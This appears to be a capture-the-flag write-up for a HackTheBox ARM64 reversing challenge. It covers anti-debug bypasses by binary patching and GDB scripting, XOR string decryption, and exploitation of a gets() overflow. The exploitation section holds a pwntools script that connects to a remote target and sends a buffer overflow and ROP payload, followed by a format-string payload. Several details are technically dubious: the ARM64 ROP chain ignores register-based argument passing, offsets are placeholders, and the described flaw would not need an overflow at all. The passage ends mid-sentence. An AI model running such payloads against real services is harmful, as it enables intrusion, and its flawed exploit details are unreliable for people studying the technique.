---
title: "Advanced ARM64 Binary Analysis - HTB 001"
description: "Deep dive into ARM64 assembly reverse engineering, exploring advanced anti-debugging techniques and custom exploit development for embedded systems."
category: "reversing"
platform: "HackTheBox"
difficulty: "hard"
date: "2025-01-15"
tags: ["ARM64", "Assembly", "Anti-Debug", "Embedded", "Reverse Engineering"]
featured: true
htbUrl: "https://labs.hackthebox.com/achievement/challenge/2141842/824"
---

# Advanced ARM64 Binary Analysis - HTB 001

## Challenge Overview

This HackTheBox challenge presents a sophisticated ARM64 binary that implements multiple layers of protection mechanisms. The challenge requires advanced reverse engineering skills, understanding of ARM64 assembly, and creative problem-solving to bypass anti-debugging techniques.

**Challenge Info:**
- **Difficulty:** Hard
- **Category:** Reversing  
- **Platform:** Linux ARM64
- **Protection:** Stripped, Anti-Debug, Encrypted Strings

## Initial Analysis

Let's start by examining the binary structure and gathering basic information:

```bash
# Basic file information
file challenge_binary
# Output: challenge_binary: ELF 64-bit LSB executable, ARM aarch64

# Check for symbols and sections
readelf -h challenge_binary
objdump -h challenge_binary

# Look for interesting strings (though they might be encrypted)
strings challenge_binary
```

The binary analysis reveals:
- 64-bit ARM64 ELF executable
- Stripped of symbols
- Contains encrypted string literals
- Implements custom protection mechanisms

## ARM64 Assembly Deep Dive

### Main Function Analysis

Using Ghidra to analyze the main function, we can see the following ARM64 assembly:

```assembly
main:
    // Function prologue
    stp     x29, x30, [sp, #-0x20]!   // Save frame pointer and link register
    mov     x29, sp                    // Set up frame pointer
    str     x19, [sp, #0x10]          // Save x19 register
    
    // Anti-debug check
    mov     w0, #0x1337               // Load magic value
    bl      check_debugger            // Call anti-debug function
    cmp     w0, #0                    // Check return value
    bne     exit_program              // Exit if debugger detected
    
    // Main logic continues...
    mov     x0, #0x400000             // Load buffer address
    mov     x1, #0x100                // Load buffer size
    bl      decrypt_strings           // Decrypt hidden strings
```

### Key ARM64 Instructions Used

1. **Stack Pointer Operations:**
   - `stp x29, x30, [sp, #-0x20]!` - Store pair with pre-decrement
   - `ldp x29, x30, [sp], #0x20` - Load pair with post-increment

2. **Branch Instructions:**
   - `bl function_name` - Branch with link (function call)
   - `bne label` - Branch if not equal
   - `cbz register, label` - Compare and branch if zero

3. **Data Movement:**
   - `mov x0, #value` - Move immediate to register
   - `ldr x0, [x1]` - Load register from memory
   - `str x0, [x1]` - Store register to memory

## Anti-Debugging Techniques

The binary implements several sophisticated anti-debugging mechanisms:

### 1. PTRACE Detection

```c
int check_debugger() {
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        // Debugger is already attached
        return 1;
    }
    ptrace(PTRACE_DETACH, 0, 1, 0);
    return 0;
}
```

### 2. Timing-Based Detection

```assembly
// Read system timer
mrs     x0, cntvct_el0        // Read virtual counter
mov     x19, x0               // Save initial time

// Execute some operations
mov     x0, #0x1000
loop:
    sub     x0, x0, #1
    cbnz    x0, loop

// Check elapsed time  
mrs     x1, cntvct_el0        // Read counter again
sub     x1, x1, x19           // Calculate difference
cmp     x1, #0x10000          // Compare with threshold
bgt     debugger_detected     // Branch if too slow
```

### 3. Hardware Breakpoint Detection

The binary monitors debug registers to detect hardware breakpoints:

```assembly
// Check debug status register
mrs     x0, mdscr_el1         // Read debug status
tst     x0, #0x8000          // Test single-step bit
bne     debugger_detected    // Branch if set
```

## Bypassing Protection Mechanisms

### Method 1: Binary Patching

We can patch the anti-debug checks directly in the binary:

```python
import struct

def patch_anti_debug(binary_path, output_path):
    with open(binary_path, 'rb') as f:
        data = bytearray(f.read())
    
    # Patch the comparison instruction to always succeed
    # Original: cmp w0, #0 (0x1f 0x00 0x00 0x71)
    # Patched:  cmp w0, #1 (0x1f 0x04 0x00 0x71)
    patch_offset = 0x1234  # Find this offset using disassembler
    data[patch_offset:patch_offset+4] = struct.pack('<I', 0x7100041f)
    
    with open(output_path, 'wb') as f:
        f.write(data)

patch_anti_debug('challenge_binary', 'patched_binary')
```

### Method 2: GDB Scripting

Create a GDB script to automatically bypass checks:

```python
# bypass_debug.py - GDB Python script
import gdb

class BypassAntiDebug(gdb.Command):
    def __init__(self):
        super().__init__("bypass", gdb.COMMAND_USER)
    
    def invoke(self, arg, from_tty):
        # Set breakpoint at anti-debug check
        gdb.execute("break *0x400000+0x1234")
        gdb.execute("run")
        
        # Modify register to bypass check
        gdb.execute("set $x0 = 0")
        gdb.execute("continue")

BypassAntiDebug()
```

## String Decryption

### Encryption Analysis

The binary uses a custom XOR-based encryption for strings:

```c
void decrypt_strings(char* buffer, size_t size) {
    uint32_t key[] = {0xdeadbeef, 0xcafebabe, 0x13371337, 0x42424242};
    
    for (size_t i = 0; i < size; i += 4) {
        uint32_t* data = (uint32_t*)(buffer + i);
        *data ^= key[(i / 4) % 4];
    }
}
```

### Python Decryption Script

```python
def decrypt_strings(encrypted_data):
    key = [0xdeadbeef, 0xcafebabe, 0x13371337, 0x42424242]
    decrypted = bytearray()
    
    for i in range(0, len(encrypted_data), 4):
        if i + 4 <= len(encrypted_data):
            # Extract 4 bytes
            chunk = struct.unpack('<I', encrypted_data[i:i+4])[0]
            
            # Apply XOR with rotating key
            decrypted_chunk = chunk ^ key[(i // 4) % 4]
            
            # Add to result
            decrypted.extend(struct.pack('<I', decrypted_chunk))
    
    return decrypted.decode('utf-8', errors='ignore')

# Extract encrypted data from binary
with open('challenge_binary', 'rb') as f:
    data = f.read()
    
# Find encrypted string section (at offset 0x2000)
encrypted_section = data[0x2000:0x2100]
decrypted_strings = decrypt_strings(encrypted_section)
print("Decrypted strings:", decrypted_strings)
```

## Vulnerability Discovery

After bypassing the protection mechanisms and decrypting strings, we discover the main vulnerability in the input handling function:

```c
void process_input() {
    char buffer[64];
    char *flag_location = get_flag_location();  // Decrypted string
    
    printf("Enter your input: ");
    gets(buffer);  // Vulnerable function - no bounds checking!
    
    if (strcmp(buffer, "secret_password") == 0) {
        printf("Access granted!\n");
        system("cat /flag.txt");
    } else {
        printf("Access denied.\n");
    }
}
```

## Exploitation

### Buffer Overflow Attack

The `gets()` function allows us to overflow the 64-byte buffer:

```python
#!/usr/bin/env python3
import struct
from pwn import *

# Connect to challenge
p = remote('target_ip', 1337)

# Craft payload
buffer_size = 64
padding = b'A' * buffer_size

# ARM64 ROP chain (example addresses)
rop_chain = [
    0x400000 + 0x1500,  # Address of system() call
    0x400000 + 0x2000,  # Address of "/bin/sh" string
]

# Pack addresses for ARM64 (8 bytes each)
payload = padding + b''.join(struct.pack('<Q', addr) for addr in rop_chain)

# Send payload
p.sendline(payload)

# Get flag
p.interactive()
```

### Alternative: Format String Attack

If there's a format string vulnerability, we can exploit it:

```python
# Leak stack addresses first
payload1 = b"%p " * 20
p.sendline(payload1)
leak = p.recvline()

# Parse leaked addresses
addresses = [int(addr, 16) for addr in leak.split() if '0x' in str(addr)]

# Use leaked addresses for further exploitation
target_address = addresses[5]  # Adjust based on analysis
payload2 = f"%{target_address & 0xffff}c%8$hn".encode()
```

## Solution Steps

1. **Static Analysis**: Use Ghidra/IDA to understand the binary structure
2. **Anti-Debug Bypass**: Patch or circumvent protection mechanisms  
3. **String Decryption**: Reverse the encryption algorithm
4. **Vulnerability Discovery**: Identify the buffer overflow
5. **Exploit Development**: Craft ROP chain for ARM64
6. **Flag Extraction**: Execute exploit to retrieve flag

## Tools and Resources

### Essential Tools
- **Ghidra**: Free reverse engineering platform
- **GDB with GEF**: Enhanced debugger for ARM64
- **QEMU**: ARM64 emulation for testing
- **pwntools**: Python exploitation framework

### ARM64 Resources
- [ARM64 Architecture Reference Manual](https://developer.arm.com/documentation/ddi0487/latest/)
- [ARM64 Assembly Quick Reference](https://courses.cs.washington.edu/courses/cse469/18wi/Materials/arm64.pdf)
- [GEF Documentation](https://hugsy.github.io/gef/)

### Useful GDB Commands for ARM64
```bash
# Set architecture
set architecture aarch64

# Examine registers
info registers
p/x $x0

# Disassemble current function
disas $pc

# Step through instructions
stepi
nexti
```

## Key Takeaways

1. **ARM64 Complexity**: ARM64 reverse engineering requires understanding of AArch64 instruction set and calling conventions
2. **Multi-layered Protection**: Modern binaries often combine multiple anti-analysis techniques
3. **Dynamic Analysis**: Static analysis alone is insufficient for heavily protected binaries
4. **Tool Familiarity**: Mastering tools like Ghidra, GDB, and scripting languages is